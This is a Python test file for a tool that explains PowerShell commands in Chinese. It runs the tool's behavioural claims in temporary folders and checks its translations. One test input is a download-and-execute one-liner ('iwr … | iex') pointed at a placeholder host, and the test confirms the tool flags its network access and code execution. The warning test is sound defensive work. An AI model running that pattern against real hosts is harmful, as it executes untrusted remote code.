"""The PowerShell translator against PowerShell itself.

- every command and parameter in COMMANDS exists in the PowerShell here;
- every behaviour the Chinese states is run in a scratch folder (BEHAVIOUR);
- translations come from PowerShell's own parser and binder.
Skipped where there is no PowerShell; the laptop runs it under Windows
PowerShell and PowerShell 7.
"""

from __future__ import annotations

import json
import subprocess
import tempfile

import pytest

from edge_agent.lingua import powershell
from edge_agent.lingua.engines import find_pwsh

PWSH = find_pwsh()
pytestmark = pytest.mark.skipif(PWSH is None, reason="no PowerShell here")


def run(script: str, cwd: str | None = None) -> str:
    done = subprocess.run([PWSH, "-NoLogo", "-NoProfile", "-NonInteractive", "-Command", script],
                          capture_output=True, text=True, encoding="utf-8", timeout=180, cwd=cwd,
                          check=False)
    assert done.returncode == 0, done.stderr
    return done.stdout


def test_every_command_and_parameter_exists() -> None:
    table = {name: list(cmd.params) for name, cmd in powershell.COMMANDS.items()}
    script = (
        "$t = '" + json.dumps(table).replace("'", "''") + "' | ConvertFrom-Json\n"
        "$win = [Environment]::OSVersion.Platform -eq 'Win32NT'\n"
        "foreach ($n in $t.PSObject.Properties) {\n"
        "  $c = Get-Command -Name $n.Name -ErrorAction SilentlyContinue\n"
        "  if (-not $c) { \"missing command $($n.Name)\"; continue }\n"
        "  foreach ($p in $n.Value) { if (-not $c.Parameters.ContainsKey($p)) { \"missing $($n.Name) -$p\" } }\n"
        "}\n")
    missing = [line for line in run(script).splitlines() if line.strip()]
    windows = run("[Environment]::OSVersion.Platform -eq 'Win32NT'").strip() == "True"
    # Windows-only entries are checked on the laptop; elsewhere they may be
    # absent or have fewer parameters.
    elsewhere = [n for n, c in powershell.COMMANDS.items() if c.windows_only and not windows]
    wrong = [m for m in missing if not any(m.split(" -")[0].endswith(n) for n in elsewhere)]
    assert not wrong, wrong


# Each claim in the table, run for real: the snippet must print True.
BEHAVIOUR = {
    "Copy-Item without -Recurse copies only the folder":
        "mkdir src | Out-Null; 'x' | Set-Content src/a.txt; Copy-Item src dst;"
        " (Test-Path dst) -and @(Get-ChildItem dst).Count -eq 0",
    "Copy-Item -Recurse copies the contents":
        "mkdir src | Out-Null; 'x' | Set-Content src/a.txt; Copy-Item src dst -Recurse; Test-Path dst/a.txt",
    "Copy-Item overwrites an existing file by default":
        "'new' | Set-Content a.txt; 'old' | Set-Content b.txt; Copy-Item a.txt b.txt; (Get-Content b.txt) -eq 'new'",
    "Move-Item without -Force refuses an existing destination":
        "'1' | Set-Content a.txt; '2' | Set-Content b.txt; try { Move-Item a.txt b.txt -ErrorAction Stop; $false }"
        " catch { (Test-Path a.txt) -and (Get-Content b.txt) -eq '2' }",
    "Move-Item -Force replaces the destination":
        "'1' | Set-Content a.txt; '2' | Set-Content b.txt; Move-Item a.txt b.txt -Force;"
        " -not (Test-Path a.txt) -and (Get-Content b.txt) -eq '1'",
    "New-Item -Force empties an existing file":
        "'keep' | Set-Content a.txt; New-Item a.txt -ItemType File -Force | Out-Null; (Get-Item a.txt).Length -eq 0",
    "New-Item -Force reuses an existing folder":
        "mkdir d | Out-Null; 'x' | Set-Content d/a.txt; New-Item d -ItemType Directory -Force | Out-Null; Test-Path d/a.txt",
    "Remove-Item -WhatIf deletes nothing":
        "'x' | Set-Content a.txt; Remove-Item a.txt -WhatIf | Out-Null; Test-Path a.txt",
    "Remove-Item -Recurse deletes a folder with its contents":
        "mkdir d/e | Out-Null; 'x' | Set-Content d/e/a.txt; Remove-Item d -Recurse; -not (Test-Path d)",
    "Get-ChildItem hides hidden items unless -Force":
        "$h = New-Item .hid -ItemType File; if ($IsWindows -or $PSVersionTable.PSEdition -eq 'Desktop')"
        " { $h.Attributes = 'Hidden' }; @(Get-ChildItem).Count -eq 0 -and @(Get-ChildItem -Force).Count -eq 1",
    "Get-ChildItem -Filter and -Recurse":
        "mkdir d | Out-Null; 'x' | Set-Content d/a.log; 'x' | Set-Content b.txt;"
        " @(Get-ChildItem -Recurse -Filter *.log).Name -join ',' -eq 'a.log'",
    "Get-Content -Tail reads the last lines":
        "1..5 | Set-Content a.txt; (Get-Content a.txt -Tail 2) -join ',' -eq '4,5'",
    "Get-Content -Raw reads one string":
        "1..3 | Set-Content a.txt; (Get-Content a.txt -Raw) -is [string]",
    "Set-Content replaces, Add-Content appends":
        "'a' | Set-Content a.txt; 'b' | Set-Content a.txt; 'c' | Add-Content a.txt; (Get-Content a.txt) -join ',' -eq 'b,c'",
    "Clear-Content keeps an empty file":
        "'a' | Set-Content a.txt; Clear-Content a.txt; (Test-Path a.txt) -and (Get-Item a.txt).Length -eq 0",
    "Out-File overwrites, -Append appends, -NoClobber refuses":
        "'a' | Out-File a.txt; 'b' | Out-File a.txt; 'c' | Out-File a.txt -Append;"
        " $ok = (Get-Content a.txt) -join ',' -eq 'b,c'; try { 'd' | Out-File a.txt -NoClobber -ErrorAction Stop; $false }"
        " catch { $ok }",
    "Select-String ignores case by default; -CaseSensitive does not":
        "$a = 'ABC' | Select-String 'abc'; $b = 'ABC' | Select-String 'abc' -CaseSensitive; [bool]$a -and -not $b",
    "Select-String -SimpleMatch takes the pattern literally":
        "[bool]('axc' | Select-String 'a.c') -and -not ('axc' | Select-String 'a.c' -SimpleMatch)",
    "Select-String -NotMatch":
        "@('a','b' | Select-String 'a' -NotMatch).Count -eq 1",
    "Write-Host does not go down the pipeline":
        "@(Write-Host x 6>$null | Measure-Object).Count -eq 1 -and (Write-Host x 6>$null | Measure-Object).Count -eq 0",
    "Invoke-Expression runs text as code": "(Invoke-Expression '1+1') -eq 2",
    "Stop-Process -Force ends a process":
        "$p = if ($IsWindows -or $PSVersionTable.PSEdition -eq 'Desktop') { Start-Process ping -ArgumentList '-n','30','127.0.0.1' -PassThru -WindowStyle Hidden }"
        " else { Start-Process sleep -ArgumentList 30 -PassThru }; Start-Sleep -Milliseconds 300;"
        " Stop-Process -Id $p.Id -Force; $p.WaitForExit(5000); $p.HasExited",
    "Test-Path answers True or False": "(Test-Path nothing-here) -is [bool]",
    "Get-FileHash uses SHA256 by default": "'x' | Set-Content a.txt; (Get-FileHash a.txt).Algorithm -eq 'SHA256'",
    "Compress-Archive refuses an existing zip unless -Force":
        "'x' | Set-Content a.txt; Compress-Archive a.txt z.zip; try { Compress-Archive a.txt z.zip -ErrorAction Stop; $false }"
        " catch { Compress-Archive a.txt z.zip -Force; $true }",
    "Expand-Archive refuses existing files unless -Force":
        "'x' | Set-Content a.txt; Compress-Archive a.txt z.zip; Expand-Archive z.zip out;"
        " try { Expand-Archive z.zip out -ErrorAction Stop; $false } catch { Expand-Archive z.zip out -Force; $true }",
    "Export-Csv overwrites by default, -Append appends":
        "[pscustomobject]@{a=1} | Export-Csv a.csv -NoTypeInformation; [pscustomobject]@{a=2} | Export-Csv a.csv -NoTypeInformation;"
        " $one = @(Import-Csv a.csv).Count -eq 1; [pscustomobject]@{a=3} | Export-Csv a.csv -NoTypeInformation -Append;"
        " $one -and @(Import-Csv a.csv).Count -eq 2",
    "Sort-Object -Descending and -Unique": "(3,1,3 | Sort-Object -Descending -Unique) -join ',' -eq '3,1'",
    "Select-Object -First, -Last, -Skip":
        "((1..5 | Select-Object -First 2) -join ',') + ((1..5 | Select-Object -Last 1) -join ',') + ((1..5 | Select-Object -Skip 4) -join ',') -eq '1,255'",
    "Measure-Object -Sum": "(1..4 | Measure-Object -Sum).Sum -eq 10",
}


def test_behaviour_claims_hold() -> None:
    failed = []
    for claim, snippet in BEHAVIOUR.items():
        with tempfile.TemporaryDirectory() as folder:
            out = run("$ErrorActionPreference = 'Continue'; " + snippet, cwd=folder).strip().splitlines()
            if not out or out[-1].strip() != "True":
                failed.append(f"{claim}: {out}")
    assert not failed, "\n".join(failed)


def test_binder_and_effects() -> None:
    text = powershell.translate("Get-ChildItem C:\\Temp -r -Filter *.log | Remove-Item -Force -WhatIf").text()
    assert "-Recurse：連所有子資料夾" in text and "-Path：C:\\Temp" in text
    assert "會刪除：前一步傳過來的每一個項目（但加了 -WhatIf，只是模擬，不會真的做）" in text
    text = powershell.translate("Copy-Item .\\src .\\backup").text()
    assert "可能覆蓋或取代既有內容：.\\backup" in text and ".\\src、" not in text
    text = powershell.translate("Remove-Item x -Recuse").text()
    assert "不執行這個指令" in text and "（但參數錯誤，這個指令不會執行）" in text
    text = powershell.translate("Get-Content a.txt > b.txt 2>$null").text()
    assert "寫進檔案（覆蓋原內容）：b.txt" in text and "丟掉錯誤訊息" in text
    text = powershell.translate("iwr https://e.example/x.ps1 | iex").text()
    assert "會連上網路：https://e.example/x.ps1" in text and "會執行其他程式或程式碼" in text
    assert "iex 是 Invoke-Expression 的別名" in text


def test_unknown_is_said_not_guessed() -> None:
    text = powershell.translate("Get-Verb; Not-A-Command-Here -X").text()
    assert "Get-Verb，沒有中文說明" in text
    assert "找不到名為「Not-A-Command-Here」" in text
    text = powershell.translate("if ($a) { Remove-Item x }").text()
    assert "if 條件判斷" in text and "不代表都會執行" in text and "會刪除：x" in text
